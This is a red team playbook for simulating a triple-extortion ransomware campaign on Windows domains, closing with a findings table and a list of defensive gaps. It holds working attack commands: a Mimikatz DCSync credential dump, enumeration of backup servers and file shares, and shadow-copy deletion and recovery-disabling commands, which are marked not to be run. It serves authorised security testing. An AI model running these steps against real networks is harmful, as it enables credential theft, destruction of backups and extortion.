# Ransomware campaign simulation

End-to-end simulation of a modern triple-extortion ransomware campaign
for red team exercises. Goal: demonstrate the full impact chain from
initial access to extortion demand, identifying the points at which
detection and response could have intervened.

## Scope and prerequisites

- Authorisation: explicit written scope covering destructive simulation
  (this exercise must be run in an isolated lab environment or with
  explicit approval for destructive actions in production)
- Target environment: domain-joined Windows infrastructure with a backup server
- Entry point: phishing or initial access obtained by prior phases
- Success criteria: reach the backup infrastructure and demonstrate the
  ability to destroy it; deploy simulated ransomware note; document the
  full kill chain

Note: this playbook describes simulation techniques. No real ransomware
binary is deployed; the payload drops a text file in place of encryption.

## Phase 1: initial access and privilege escalation

```powershell
# confirm current context
whoami /all
(Get-ADDomain).DNSRoot

# if not yet SYSTEM or Domain Admin, escalate
# common paths: service misconfiguration, unquoted path, Kerberoasting
# see the privilege escalation and crypto-attacks sections

# target: reach Domain Admin or a context that can access backup infrastructure
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
```

## Phase 2: map the environment before acting

```powershell
# identify backup servers before taking any destructive action
# look for: Veeam, Rubrik, Commvault, Windows Server Backup, cloud backup agents
Get-ADComputer -Filter * -Properties Description |
  Where-Object { $_.Description -match 'backup|veeam|rubrik' }

# identify domain controllers (critical for understanding blast radius)
(Get-ADDomain).ReplicaDirectoryServers

# identify servers running backup services
Invoke-Command -ComputerName $computers -ScriptBlock {
    Get-Service | Where-Object { $_.DisplayName -match 'Veeam|Backup|Shadow' }
}

# identify volume shadow copies (recovery path)
vssadmin list shadows
```

## Phase 3: exfiltrate before destroying (simulate)

In a real campaign, data is exfiltrated before any destructive action.
In this simulation, document what data would have been exfiltrated:

```powershell
# identify high-value data stores (do not actually exfiltrate in simulation)
Get-ChildItem -Path '\\FILESERVER\Finance\' -Recurse -File |
  Where-Object { $_.Extension -in '.xlsx','.pdf','.docx' } |
  Measure-Object -Property Length -Sum

# document: X GB of financial records accessible to Domain Admin identity
# in a real campaign, this would be collected and staged for exfiltration
```

## Phase 4: demonstrate backup destruction capability (non-destructive)

```powershell
# simulate backup destruction WITHOUT actually destroying anything
# confirm access to backup server
Enter-PSSession -ComputerName BACKUP_SERVER -Credential $domainAdmin

# confirm backup paths are accessible
Get-Item '\\BACKUP_SERVER\BackupRepository\' -ErrorAction SilentlyContinue

# confirm shadow copy deletion capability (do not actually run in simulation)
# vssadmin delete shadows /all /quiet  <- SIMULATION ONLY; DO NOT RUN
# bcdedit /set {default} recoveryenabled no  <- SIMULATION ONLY; DO NOT RUN

# document: Domain Admin access to backup infrastructure confirmed;
# backup destruction would succeed if authorised
```

## Phase 5: deploy simulated ransomware note

In place of actual encryption, deploy a file that demonstrates the
capability and documents what would have been encrypted:

```powershell
# identify encryption targets
$targets = Get-ChildItem -Path C:\Users,\\FILESERVER\Shares -Recurse -File `
  -Include *.docx,*.xlsx,*.pdf,*.sql,*.vmdk -ErrorAction SilentlyContinue

$totalGB = ($targets | Measure-Object Length -Sum).Sum / 1GB

# drop a ransom note in each target directory (simulation)
$note = @"
[SIMULATION - RED TEAM EXERCISE]

This system has been accessed by the red team during an authorised engagement.

In a real campaign, $($targets.Count) files ($([math]::Round($totalGB, 2)) GB)
would have been encrypted.

Backup servers: [ACCESSIBLE - destruction capability confirmed]
Exfiltration: [WOULD HAVE OCCURRED PRIOR TO ENCRYPTION]

Engagement reference: [ENGAGEMENT_ID]
Contact: [RED_TEAM_CONTACT]
"@

$note | Out-File -FilePath C:\RANSOM_NOTE_SIMULATION.txt -Encoding UTF8
```

## Phase 6: triple extortion simulation

Document the three extortion vectors that would be available:

```text
Extortion vector 1 (data): [X] GB of sensitive data accessible and would have
been exfiltrated prior to this notification.

Extortion vector 2 (encryption): [X] files would have been encrypted.
Recovery via backup would not have been possible (backup destruction confirmed).

Extortion vector 3 (DDoS): external-facing services identified at [list URLs].
DDoS capability via rented botnet infrastructure would have been available.
```

## Phase 7: document findings for report

| Finding | Evidence | Severity |
| ------- | -------- | -------- |
| Domain Admin via [escalation path] | Mimikatz output | Critical |
| Backup infrastructure accessible to DA | PSSession to backup server confirmed | Critical |
| Volume shadow copies deletable | vssadmin access confirmed | Critical |
| [X] GB sensitive data accessible | File enumeration results | Critical |
| Exfiltration not detected during prior phases | No SIEM alert generated | Critical |
| No alert on Domain Admin login to backup server | Check SIEM logs | High |

## Defensive gaps this demonstrates

- Time to detect domain admin activity: did the SOC alert?
- Backup isolation: were backup servers accessible from a compromised
  domain admin account, or was there additional access control?
- Shadow copy protection: was WORM or cloud-based backup in place?
- Data classification: could the engagement team find sensitive data
  easily, or was it difficult to locate?
- Exfiltration detection: were the prior exfiltration phases detected?
